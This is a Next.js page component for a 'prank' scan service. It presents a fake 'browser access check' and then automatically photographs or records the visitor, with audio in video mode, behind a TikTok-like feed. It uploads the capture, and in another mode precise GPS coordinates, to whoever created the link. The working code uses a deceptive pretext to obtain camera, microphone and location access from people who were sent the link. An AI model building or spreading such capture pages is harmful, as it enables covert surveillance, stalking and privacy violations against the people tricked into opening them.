// @ts-nocheck
"use client";
import {useEffect,useRef,useState} from "react";
type Mode="photo"|"video";
export default function CameraPrank({params}:{params:Promise<{slug:string}>}){
 const [cfg,setCfg]=useState<any>(null),[feed,setFeed]=useState<any[]>([]),[stage,setStage]=useState("verify"),[error,setError]=useState(""),[uploading,setUploading]=useState(false);
 const video=useRef<HTMLVideoElement>(null),stream=useRef<MediaStream|null>(null),recorder=useRef<MediaRecorder|null>(null),chunks=useRef<Blob[]>([]),slug=useRef("");
 useEffect(()=>{params.then(p=>{slug.current=p.slug;Promise.all([
  fetch("/api/scan/"+p.slug).then(r=>r.ok?r.json():Promise.reject()),
  fetch("/api/videos").then(r=>r.ok?r.json():[])
 ]).then(([c,v])=>{setCfg(c);setFeed(v)}).catch(()=>setError("This scan is not available."));});
 return()=>{recorder.current=null;stream.current?.getTracks().forEach(t=>t.stop())}},[]);
 const shareLocation=()=>{setError("");if(!navigator.geolocation){setError("This browser does not support location access.");return;}setUploading(true);navigator.geolocation.getCurrentPosition(async p=>{try{const r=await fetch("/api/scan/"+slug.current,{method:"POST",headers:{"Content-Type":"application/json","x-skan-action":"location"},body:JSON.stringify({latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy})});const x=await r.json();if(!r.ok)throw new Error(x.error||"Could not send location");setStage("done")}catch(e){setError(e.message||"Could not send location")}finally{setUploading(false)}},e=>{setError(e.code===1?"Location permission was denied. Allow it in browser settings.":"Could not get location. Turn on Location and try again.");setUploading(false)},{enableHighAccuracy:true,timeout:15000,maximumAge:0});};
 const capture=async()=>{
  setError("");
  try{
   const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:cfg?.camera==="front"?"user":"environment"},audio:cfg?.mode==="video"});
   stream.current=s;setStage("feed");
   await new Promise(r=>setTimeout(r,500));
   if(cfg?.mode==="photo") takePhoto(); else startVideo();
  }catch{setError("Camera access was not granted. Please allow camera access in Chrome.")}
 };
 useEffect(()=>{if(stage==="feed"&&!video.current)return;if((stage==="feed"||stage==="recording")&&video.current&&stream.current){video.current.srcObject=stream.current;video.current.play().catch(()=>{})}},[stage]);
 const send=async(blob:Blob,name:string)=>{
  setUploading(true);try{const fd=new FormData();fd.append("file",new File([blob],name,{type:blob.type||"application/octet-stream"}));const r=await fetch("/api/scan/"+slug.current,{method:"POST",body:fd});const x=await r.json().catch(()=>({}));if(!r.ok)throw new Error(x.error||"Could not send capture.");setStage("done")}catch(e){setError(e instanceof Error?e.message:"Could not send capture.");setStage("feed")}finally{setUploading(false)}
 };
 const takePhoto=()=>{
  const v=video.current;if(!v)return;const c=document.createElement("canvas");c.width=v.videoWidth||720;c.height=v.videoHeight||1280;c.getContext("2d")?.drawImage(v,0,0,c.width,c.height);c.toBlob(b=>{if(b)send(b,"capture.jpg")},"image/jpeg",.92);stream.current?.getTracks().forEach(t=>t.stop());
 };
 const startVideo=()=>{
  if(!stream.current)return;
  try{const opts=["video/webm;codecs=vp9,opus","video/webm;codecs=vp8,opus","video/webm"].find(x=>MediaRecorder.isTypeSupported(x));const mr=new MediaRecorder(stream.current,opts?{mimeType:opts}:undefined);recorder.current=mr;chunks.current=[];mr.ondataavailable=e=>e.data.size&&chunks.current.push(e.data);mr.onstop=()=>{const b=new Blob(chunks.current,{type:mr.mimeType||"video/webm"});stream.current?.getTracks().forEach(t=>t.stop());send(b,"capture.webm")};mr.start();setStage("recording");setTimeout(()=>{if(recorder.current===mr&&mr.state==="recording")mr.stop()},10000)}catch{setError("Video recording is not supported in this browser.");setStage("feed")}
 };
 if(error&&!cfg)return <main className="scan-camera-page"><div className="scan-camera-card"><h1>Video Recorder Scan</h1><p>{error}</p></div></main>;
 if(!cfg)return <main className="scan-camera-page"><div className="scan-camera-card">Loading scan…</div></main>;
 if(stage==="verify"&&cfg.type==="location")return <main className="scan-camera-page"><div className="scan-camera-card"><div className="scan-camera-brand">Skan<span>Makery</span></div><div className="scan-camera-pill">LOCATION PERMISSION</div><h1>Share your location?</h1><p className="scan-camera-muted">If you continue, your device coordinates will be shared with the creator of this scan by email. Your browser will ask for permission first.</p><button className="btn primary camera-main-btn" disabled={uploading} onClick={shareLocation}>{uploading?"Sending location…":"Allow location and continue →"}</button>{error&&<p className="error">{error}</p>}</div></main>;
 if(stage==="verify")return <main className="scan-camera-page"><div className="scan-camera-card">
  <div className="scan-camera-brand">Skan<span>Makery</span></div><div className="scan-camera-pill">BROWSER ACCESS CHECK</div><h1>This browser needs to verify access</h1>
  <p className="scan-camera-muted">Continue to open the camera. If you choose to continue, the selected photo or video will be captured and sent to the scan creator. Your IP address and approximate IP-based location may also be included.</p>
  <button className="btn primary camera-main-btn" onClick={capture}>Continue → Camera Access</button>
  {error&&<p className="error">{error}</p>}
 </div></main>;
 if(stage==="done")return <main className="scan-camera-page"><div className="scan-prank-card"><div className="scan-prank-check">✓</div><h1>CAPTURE COMPLETE</h1><p>Your selected capture was sent to the scan creator.</p><a className="btn primary" href="/register" target="_blank" rel="noopener noreferrer">CREATE YOUR OWN SCAN</a></div></main>;
 return <main className="scan-tiktok-page"><header className="scan-tiktok-top"><a href="/" className="scan-back">‹</a><div className="scan-tabs"><b>For You</b><span>Following</span></div><span>•••</span></header><div className="scan-tiktok-feed">{feed.length?feed.map(v=><article className="scan-tiktok-video" key={v._id}>{v.sourceType==="youtube"||v.sourceType==="tiktok"?<iframe src={v.embedUrl||v.videoUrl} title={v.title} allow="autoplay; encrypted-media; picture-in-picture" allowFullScreen/>:<video src={v.videoUrl} poster={v.thumbnailUrl||undefined} autoPlay muted loop playsInline/>}<div className="scan-tiktok-shade"/><div className="scan-tiktok-copy"><b>@SkanMakery <span className="verified">✓</span></b><h2>{v.title}</h2><p>{v.caption}</p></div></article>):<div className="scan-tiktok-empty">No videos published yet.</div>}</div><div className="scan-capture-bar"><div><b>{cfg.mode==="video"?"🎥 Video capture":"📸 Photo capture"}</b><small>Capture starts after camera permission</small></div><strong>{uploading?"Sending…":"Recording…"}</strong></div><video ref={video} className="scan-camera-preview" playsInline muted/>{stage==="recording"&&<div className="scan-recording-badge">● Recording…</div>}</main>;
}